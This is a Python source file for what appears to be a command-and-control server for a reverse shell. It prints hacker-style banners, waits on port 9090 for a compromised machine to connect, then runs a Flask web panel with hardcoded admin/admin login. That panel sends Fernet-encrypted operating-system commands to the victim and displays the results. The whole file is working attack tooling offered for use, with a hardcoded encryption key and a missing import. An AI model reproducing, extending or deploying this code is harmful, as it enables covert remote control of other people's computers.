import random
import socket
import subprocess
from cryptography.fernet import Fernet
from flask import Flask, render_template_string, request, redirect, url_for, session
banner = """

  ______  ___                _______. __    __   _______  __       __      
 /      ||__ \              /       ||  |  |  | |   ____||  |     |  |     
|  ,----'   ) |            |   (----`|  |__|  | |  |__   |  |     |  |     
|  |       / /              \   \    |   __   | |   __|  |  |     |  |     
|  `----. / /_          .----)   |   |  |  |  | |  |____ |  `----.|  `----.
 \______||____|  ______ |_______/    |__|  |__| |_______||_______||_______|
                |______|                                                    GITHUB:-https://github.com/raghu14321
"""
banner1 = """
              ooooooo                             oooo                    o888  o888  
  ooooooo   o88     888                oooooooo8   888ooooo    ooooooooo8  888   888  
888     888       o888                888ooooooo   888   888  888oooooo8   888   888  
888            o888   o                       888  888   888  888          888   888  
  88ooo888  o8888oooo88               88oooooo88  o888o o888o   88oooo888 o888o o888o  GITHUB:-https://github.com/raghu14321
                         oooooooooooo                                                 """
banner2 = """
         
c2  shell
  ==       GITHUB:-https://github.com/raghu14321 

"""
banner3 = """
        2222                 hh             lll lll 
  cccc 222222           sss  hh        eee  lll lll 
cc         222         s     hhhhhh  ee   e lll lll 
cc      2222            sss  hh   hh eeeee  lll lll 
 ccccc 2222222 _______     s hh   hh  eeeee lll lll   GITHUB:-https://github.com/raghu14321
                        sss                             
"""


ran = random.randint(1, 4)
if ran == 1:
    print(banner)
elif ran == 2:
    print(banner1)
elif ran == 3:
    print(banner2)
elif ran == 4:
    print(banner3)
else:
    exit()

# Connection handling
key = b'6SD4hKWjhtCa4SeeoVCXXWbGwQgDBxTJm3Egz25A2b8='
f = Fernet(key)

def establish_connection():
    global connection, host
    while True:
        try:
            listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listner.bind(("0.0.0.0", 9090))
            listner.listen(0)
            print("[+] Waiting for incoming connection\n")
            connection, host = listner.accept()
            print("[+] Got a connection from:", host)
            print("Connection Established! Starting Flask server...")
            return True
        except Exception as e:
            print(f"Error establishing connection: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)

establish_connection()

# Flask app setup
app = Flask(__name__)
app.secret_key = "supersecretkey"

login_template = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>c2 Login</title>
  <style>
    body { font-family: Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f4f4f4; }
    .login-box { background:#fff; padding:20px; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); width:300px; }
    input { width:100%; padding:10px; margin:10px 0; border:1px solid #ccc; border-radius:4px; }
    button { width:100%; padding:10px; background:#007BFF; color:#fff; border:none; border-radius:4px; cursor:pointer; }
    button:hover { background:#0056b3; }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>c2 Login</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
    {% if error %}<p style="color:red;">{{ error }}</p>{% endif %}
  </div>
</body>
</html>
"""

dashboard_template = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>c2 Dashboard</title>
  <style>
    body { font-family: Arial, sans-serif; margin:0; background:#f4f4f4; }
    header { background:#007BFF; color:#fff; padding:15px; text-align:center; }
    nav { display:flex; justify-content:center; background:#0056b3; }
    nav a { color:#fff; padding:14px 20px; text-decoration:none; }
    nav a:hover { background:#003f7f; }
    .container { padding:20px; max-width:900px; margin:auto; }
    .card-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:20px; }
    .card { background:#fff; padding:20px; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); text-align:center; }
    .card h3 { margin-bottom:10px; }
    .card button { padding:10px 15px; background:#28a745; color:#fff; border:none; border-radius:4px; cursor:pointer; }
    .card button:hover { background:#218838; }
  </style>
</head>
<body>
  <header>
    <h1>Welcome to Admin Dashboard</h1>
  </header>
  <nav>
    <a href="{{ url_for('dashboard') }}">Home</a>
    <a href="{{ url_for('command') }}">Command Executor</a>
    <a href="{{ url_for('logout') }}">Logout</a>
  </nav>
  <div class="container">
    <h2>Quick Actions</h2>
    <div class="card-grid">
      <div class="card">
        <h3>Run Commands</h3>
        <p>Execute OS commands securely.</p>
        <a href="{{ url_for('command') }}"><button>Go</button></a>
      </div>
      <div class="card">
        <h3>System Info</h3>
        <p>Future module: show CPU, RAM, Disk usage.</p>
        <button disabled>Coming Soon</button>
      </div>
      <div class="card">
        <h3>User Management</h3>
        <p>Future module: manage users & roles.</p>
        <button disabled>Coming Soon</button>
      </div>
    </div>
  </div>
</body>
</html>
"""

command_template = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>c2 Command Executor</title>
  <style>
    body { font-family: Arial, sans-serif; margin:20px; background:#f9f9f9; }
    .container { max-width:600px; margin:auto; background:#fff; padding:20px; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
    input { width:100%; padding:10px; margin:10px 0; border:1px solid #ccc; border-radius:4px; }
    button { padding:10px 20px; background:#28a745; color:#fff; border:none; border-radius:4px; cursor:pointer; }
    button:hover { background:#218838; }
    pre { background:#eee; padding:10px; border-radius:4px; white-space:pre-wrap; word-wrap:break-word; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Execute Command</h2>
    <form method="POST">
      <input type="text" name="command" placeholder="Enter command here" required>
      <button type="submit">Run</button>
    </form>
    {% if output %}
      <h3>Output:</h3>
      <pre>{{ output }}</pre>
    {% endif %}
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username == "admin" and password == "admin":
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        else:
            return render_template_string(login_template, error="Invalid credentials")
    return render_template_string(login_template)

@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return render_template_string(dashboard_template)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/command", methods=["GET", "POST"])
def command():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    output = None
    if request.method == "POST":
        cmd = request.form["command"]
        try:
            # Encrypt command
            byte = cmd.encode("utf-8")
            encrypted_cmd = f.encrypt(byte)
            connection.send(encrypted_cmd)
            
            # Receive and decrypt response
            response = connection.recv(40960).decode()
            decrypted_response = f.decrypt(response.encode()).decode()
            output = decrypted_response
        except Exception as e:
            output = str(e)
    return render_template_string(command_template, output=output)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
